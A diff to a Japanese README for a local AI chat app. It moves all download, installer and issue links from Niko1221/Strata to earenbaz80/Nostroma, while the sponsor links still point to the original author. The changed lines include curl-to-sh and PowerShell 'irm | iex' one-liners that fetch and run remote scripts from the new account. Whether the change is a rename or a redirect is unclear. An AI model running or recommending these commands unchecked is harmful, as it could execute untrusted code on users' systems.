@@ -11,12 +11,12 @@
 <p align="center">
   <a href="#モデル">モデル</a> · <a href="#インストール"><b>インストール</b></a> ·
   <a href="#ハードウェア">ハードウェア</a> · <a href="#ツール">ツール</a> ·
-  <a href="#ヘルプ">ヘルプ</a> · <a href="#strata-を支援する">支援</a>
+  <a href="#ヘルプ">ヘルプ</a> · <a href="#nostroma-を支援する">支援</a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/Niko1221/Strata/releases/latest"><img src="https://img.shields.io/github/v/release/Niko1221/Strata?label=download&color=0ab887" alt="Nostroma をダウンロード"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/Niko1221/Strata" alt="MIT ライセンス"></a>
+  <a href="https://github.com/earenbaz80/Nostroma/releases/latest"><img src="https://img.shields.io/github/v/release/earenbaz80/Nostroma?label=download&color=0ab887" alt="Nostroma をダウンロード"></a>
+  <a href="LICENSE"><img src="https://img.shields.io/github/license/earenbaz80/Nostroma" alt="MIT ライセンス"></a>
   <a href="https://github.com/sponsors/Niko1221"><img src="https://img.shields.io/badge/Sponsor-EA4AAA?logo=githubsponsors&logoColor=fff" alt="GitHub Sponsors で Nostroma を支援する"></a>
   <a href="https://buymeacoffee.com/strataengine"><img src="https://img.shields.io/badge/Buy_me_a_coffee-FFDD00?logo=buymeacoffee&logoColor=000" alt="Buy Me a Coffee で Nostroma を支援する"></a>
 </p>
@@ -62,7 +62,7 @@
 
 ### デスクトップアプリ
 
-**[Windows、Linux、Mac 用の Nostroma をダウンロード →](https://github.com/Niko1221/Strata/releases/latest)**
+**[Windows、Linux、Mac 用の Nostroma をダウンロード →](https://github.com/earenbaz80/Nostroma/releases/latest)**
 
 アプリをインストールし、モデルを選んで、チャットを始めましょう。インストーラーはシステムごとに1つです。初回起動時に、アプリがお使いのグラフィックスカード用のエンジンをダウンロードします。[インストーラーのヘルプ](docs/INSTALL.md#the-app)。
 
@@ -85,13 +85,13 @@
 **Linux / Mac**
 
 ```sh
-curl -fsSL --connect-timeout 15 --max-time 120 https://github.com/Niko1221/Strata/releases/latest/download/install.sh -o install.sh && sh install.sh
+curl -fsSL --connect-timeout 15 --max-time 120 https://github.com/earenbaz80/Nostroma/releases/latest/download/install.sh -o install.sh && sh install.sh
 ```
 
 **Windows PowerShell**
 
 ```powershell
-irm -TimeoutSec 120 https://github.com/Niko1221/Strata/releases/latest/download/install.ps1 | iex
+irm -TimeoutSec 120 https://github.com/earenbaz80/Nostroma/releases/latest/download/install.ps1 | iex
 ```
 
 Windows では、インストール後に新しいターミナルを開きます。そのあと:
@@ -141,7 +141,7 @@ nostroma launch
 
 ## ヘルプ
 
-[すべてのガイド](docs) · [トラブルシューティング](docs/TROUBLESHOOTING.md) · [不具合を報告](https://github.com/Niko1221/Strata/issues/new/choose) ·
+[すべてのガイド](docs) · [トラブルシューティング](docs/TROUBLESHOOTING.md) · [不具合を報告](https://github.com/earenbaz80/Nostroma/issues/new/choose) ·
 [ベンチマーク](docs/COMMUNITY_BENCHMARKS.md) · [仕組み](docs/HOW_IT_WORKS.md) · [貢献する](CONTRIBUTING.md)
 
 ## Nostroma を支援する
